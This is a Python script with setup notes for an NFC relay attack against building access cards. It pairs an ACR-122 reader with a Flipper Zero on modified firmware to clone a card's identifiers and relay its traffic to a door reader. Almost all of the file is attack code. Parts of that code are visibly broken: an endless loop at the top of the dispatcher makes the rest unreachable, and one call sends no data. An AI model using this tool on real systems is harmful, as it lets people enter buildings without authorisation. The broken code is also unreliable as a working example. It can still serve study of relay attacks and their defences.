### relay.py
'''
DISCLAIMER : This program was created for research and educational purposes only with 
    no warranty whatsoever.

Created by TESSIER Solal -- 09-feb-2026

Using the pyscard (smartcard) module, the goal is to simulate a NFC relay attack between
    a legitimate reader and a legitimate access card to grant access to a building
    without the access card being physically close to the reader using
    an ACR-122 and a FlipperZero with modded firmware by gvinet on GitHub. To run this,
    you will also need to download and compile the libnfc library.
I have forked gvinet's repo to add a few upgrades
    (https://github.com/Panostop/flipperzero-firmware-relay). 


To set up the Flipper :
    - Plug it into the Raspberry Pi
    - run : 
        - git clone "https://github.com/Panostop/flipperzero-firmware-relay.git" 
        - cd flipperzero-firmware-relay

        # this script can be used each time you need it, it cleans, compiles and flashes the flipper
        - ./flasher
    - wait for the build and installation to finish on the Flipper (can take a while)

The ACR122 is not used twice because of restrictions in emulation mode.

For this program to work, you will need to call it with root privileges because of
    the pyscard module. To do so, because of pyenv shims, call 
    sudo $(which python) relay.py
    to avoid sudo using it's own python environment


This is the physical setup expected :

    [Access Card].))  ((.[ACR-122U]---[RasPi]---[FlipperZero].))  ((.[Reader]


'''


from smartcard.System import readers
from smartcard.CardType import AnyCardType
from smartcard.CardRequest import CardRequest
from smartcard.util import toHexString
from smartcard import PassThruCardService

from pynfcreader.devices import flipper_zero
from pynfcreader.sessions.iso14443.iso14443a import Iso14443ASession
from pynfcreader.sessions.iso14443.tpdu import Tpdu

#we will need a shell to get the card's information
from subprocess import * 
import time


reader_list=readers() #list pc/sc readers
CARDTYPE = AnyCardType() #cardtype object for when we will look for the Access Card

# Initialize and connect to the flipperZero
flipper = flipper_zero.FlipperZero("", debug=False)
flipper.connect()
flipper.set_mode_emu_iso14443A()



def getCardInfo() -> list[str]:
    """
    Uses the libnfc library to gather UID, ATQA and SAK from the card.
    """
    
    # Used files for better clarity and because of issues with pipes
    with open("CardInfo.txt", "w") as CardInfo:
        
        # returns the full card info
        CardInfo = Popen( ["nfc-list"], 
                        stdout=CardInfo,
                        stderr=PIPE,
                        )
        CardInfo.communicate() #wait for the output, it often takes a bit
    
    with open("CardInfo.txt", "r") as CardInfo:
        CardInfoLines = [line.rstrip() for line in CardInfo] #load the file in a list
     
        # filter the output to keep the info we need, 
        # deletes the first and last three lines (the two last empty lines count as one)
        #del CardInfoLines[0]
        #del CardInfoLines[0]
        #del CardInfoLines[0]
        #del CardInfoLines[-1]
        #del CardInfoLines[-1]
        
        # keep only the second half for the lines we need (the actual values after the ': ')
        CardInfoLines = [CardInfoLines[i].split(': ')[1] for i in range(3, 6)]
    
    # ATQA / UID / SAK
    return CardInfoLines

def transfer_apdu(apdu: str, card: PassThruCardService) -> str:
    print(f"apdu {apdu}")
    card_response, sw1, sw2 = card.connection.transmit()
    return card_response
    
class Emu(Iso14443ASession):
    # inspired by gvinet's example on github.com/gvinet/pynfcreader at 
    # examples/emu_flipper_zero_iso14443_a_relay.py

    def __init__(self, cid=0, nad=0, drv=None, block_size=16, process_function=None, card=None):
        Iso14443ASession.__init__(self, cid, nad, drv, block_size)
        self._addCID = False
        self.drv = self._drv
        self.process_function = process_function
        self.card = card

    def run(self):
        self.drv.start_emulation()
        print("...go!")
        self.low_level_dispatcher()

    def low_level_dispatcher(self):
        while 1:
            capdu = bytes()
        ats_sent = False

        iblock_resp_lst = []

        while 1:
            r = flipper.emu_get_cmd()
            rtpdu = None
            print(f"tpdu < {r}")
            if r == "off":
                self.field_off()
            elif r == "on":
                self.field_on()
                ats_sent = False
            else:
                tpdu = Tpdu(bytes.fromhex(r))

                if (tpdu.tpdu[0] == 0xE0) and (ats_sent is False):
                    rtpdu, crc = "0A788082022063CBA3A0", True
                    ats_sent = True
                elif tpdu.r:
                    rtpdu, crc = self.rblock_process(tpdu)
                elif tpdu.s:
                    print("s block")
                    # Deselect
                    if len(tpdu._inf_field) == 0:
                        rtpdu, crc = "C2E0B4", False
                    # Otherwise, it is a WTX

                elif tpdu.i:
                    print("i block")
                    capdu += tpdu.inf

                    if tpdu.is_chaining() is False:
                        rapdu = self.process_function(capdu)
                        capdu = bytes()
                        self.iblock_resp_lst = self.chaining_iblock(data=rapdu)
                        rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True

                print(f">>> rtdpu {rtpdu}\n")
                flipper.emu_send_resp(bytes.fromhex(rtpdu), crc)

def main():

    

    # Display the list of readers
    print("Available PC/SC readers :\n")
    for i in range(len(reader_list)):
        print(f"\t-\t{reader_list[i].name}")
    print("")

    if not len(reader_list) == 1 or not "ACR122" in reader_list[0].name:
        print(f"Need exactly 1 ACR122 to continue, {len(reader_list)} readers available.")
        exit(1)
  
    # Now we want to wait for the presence of a card on the ACR122, 
    #     since we cannot start emulating without it
  
    #configure the waitforcard() method to accept any cardType for 5s on the ACR122
    cardrequest = CardRequest(timeout=5, cardType=CARDTYPE) 
    # launch the waitforcard event and connect to the card
    card_to_emulate = cardrequest.waitforcard() 
    card_to_emulate.connection.connect()

    card_info = getCardInfo() # [ATQA, UID, SAK]
    print(f"This card will be emulated :\
          \n\t - ATQA : {card_info[0]}\
          \n\t - UID : {card_info[1]}\
          \n\t - SAK : {card_info[2]}")
    
    for i in range(3):
        #joins all the bytes in a continuous string for later
        card_info[i] = "".join(card_info[i].split()) 
    
    flipper.set_atqa(card_info[0])
    flipper.set_uid(card_info[1])
    flipper.set_sak(card_info[2])

    relay = Emu(drv=flipper, process_function=transfer_apdu, card=card_to_emulate)
    relay.run()


if __name__=='__main__':
    main()